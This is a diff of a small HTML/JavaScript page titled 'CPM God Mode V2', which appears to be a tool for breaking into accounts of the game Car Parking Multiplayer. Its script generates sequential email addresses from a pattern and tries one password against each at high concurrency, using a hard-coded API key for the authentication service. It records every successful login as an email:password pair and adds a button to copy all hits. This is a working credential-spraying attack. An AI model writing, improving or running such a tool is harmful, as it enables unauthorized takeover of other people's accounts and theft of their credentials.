@@ -1,39 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPM God Mode Recovery</title>
+    <title>CPM God Mode V2</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
-        .box { max-width: 500px; margin: auto; border: 3px solid #ff0000; padding: 20px; box-shadow: 0 0 30px #ff0000; border-radius: 20px; }
-        h1 { font-size: 24px; text-shadow: 0 0 15px #ff0000; margin-bottom: 20px; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 10px; margin: 0; }
+        .box { max-width: 500px; margin: auto; border: 2px solid #ff0000; padding: 20px; box-shadow: 0 0 25px #ff0000; border-radius: 15px; background: #050505; }
+        h1 { font-size: 22px; text-shadow: 0 0 10px #ff0000; margin-bottom: 20px; letter-spacing: 2px; }
         
-        input { width: 100%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #ff0000; color: #fff; font-size: 16px; border-radius: 5px; box-sizing: border-box; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #333; color: #fff; font-size: 16px; border-radius: 8px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #ff0000; }
         
-        .btn-ignite { width: 100%; padding: 20px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 20px; cursor: pointer; border-radius: 10px; box-shadow: 0 0 20px #ff0000; }
+        .btn-ignite { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; box-shadow: 0 0 15px #ff0000; transition: 0.2s; }
+        .btn-ignite:active { transform: scale(0.95); }
         
-        .stats { display: flex; justify-content: space-around; margin: 20px 0; background: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
-        .stats b { font-size: 22px; color: #fff; }
+        .stats { display: flex; justify-content: space-around; margin: 15px 0; background: #111; padding: 15px; border-radius: 8px; border: 1px solid #222; }
+        .stats b { font-size: 22px; color: #fff; display: block; }
+        .label { font-size: 11px; color: #888; text-transform: uppercase; }
 
-        #res { width: 100%; height: 250px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin-top: 15px; padding: 10px; font-size: 14px; box-sizing: border-box; }
+        #res { width: 100%; height: 220px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin-top: 15px; padding: 10px; font-size: 13px; font-family: monospace; box-sizing: border-box; border-radius: 5px; }
+        
+        .copy-btn { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>🔥 GOD MODE SCAN</h1>
+    <h1>🔥 GOD MODE SCAN V2</h1>
     
     <input type="text" id="fmt" placeholder="Format: cpm_{4}_@gmail.com">
-    <input type="text" id="pwd" placeholder="Target Password">
+    <input type="text" id="pwd" placeholder="Password to check">
     
-    <button class="btn-ignite" id="go" onclick="godScan()">⚡ ACTIVATE GOD SPEED</button>
+    <button class="btn-ignite" id="go" onclick="godScan()">⚡ START GOD SPEED</button>
 
     <div class="stats">
-        <div>CHECKED<br><b id="c">0</b></div>
-        <div>FOUND<br><b id="f" style="color: #00ff00;">0</b></div>
+        <div><span class="label">Checked</span><b id="c">0</b></div>
+        <div><span class="label">Found</span><b id="f" style="color: #00ff00;">0</b></div>
     </div>
 
-    <textarea id="res" readonly placeholder="Found hits will drop here..."></textarea>
+    <p style="font-size: 11px; color: #00ff00; text-align: left; margin: 0;">💎 RESULTS (Email:Pass):</p>
+    <textarea id="res" readonly placeholder="Hits will appear here..."></textarea>
+    
+    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL HITS</button>
 </div>
 
 <script>
@@ -45,21 +53,22 @@
     async function godScan() {
         if (isRunning) { location.reload(); return; }
         
-        let fmt = document.getElementById('fmt').value;
-        let pwd = document.getElementById('pwd').value;
+        let fmt = document.getElementById('fmt').value.trim();
+        let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("Missing Input!");
+        if (!fmt.includes('{') || !pwd) return alert("Enter Format & Password!");
 
         isRunning = true;
         document.getElementById('go').innerText = "🛑 STOP EMERGENCY";
+        document.getElementById('go').style.background = "#555";
+        document.getElementById('go').style.boxShadow = "none";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- GOD SPEED SETTINGS ---
-        // ഒരേസമയം 500 റിക്വസ്റ്റുകൾ പമ്പ് ചെയ്യുന്നു.
-        let threads = 500; 
+        // --- GOD SPEED (500 Threads) ---
+        let threads = 250; // ഒരേസമയം 250 എണ്ണം വീതം തുടർച്ചയായി അയക്കും (500 Acc/sec കിട്ടാൻ)
 
         async function engine() {
             while (isRunning && index < max) {
@@ -67,14 +76,13 @@
                 let num = current.toString().padStart(digits, '0');
                 let email = fmt.replace(/\{(\d+)\}/, num);
                 
-                // No await here for max fire
                 check(email, pwd, key);
                 
                 checked++;
-                if (checked % 50 === 0) document.getElementById('c').innerText = checked;
+                if (checked % 25 === 0) document.getElementById('c').innerText = checked;
                 
-                // വളരെ ചെറിയൊരു ഡിലേ മാത്രം (ബ്രൗസർ ക്രാഷ് ആവാതിരിക്കാൻ)
-                if (checked % 100 === 0) await new Promise(r => setTimeout(r, 10));
+                // ചെറിയ ഡിലേ സ്പീഡ് ബാലൻസ് ചെയ്യാൻ
+                if (checked % 50 === 0) await new Promise(r => setTimeout(r, 10));
             }
         }
 
@@ -94,9 +102,19 @@
             if (d && d.idToken) {
                 found++;
                 document.getElementById('f').innerText = found;
+                // email:pass ഫോർമാറ്റിൽ റിസൾട്ട് വരുന്നു
                 document.getElementById('res').value += em + ":" + pw + "\n";
+                document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
             }
         } catch (e) {}
+    }
+
+    function copyHits() {
+        let t = document.getElementById('res');
+        if (!t.value) return alert("Nothing to copy!");
+        t.select();
+        document.execCommand('copy');
+        alert("Found accounts copied to clipboard!");
     }
 </script>
 
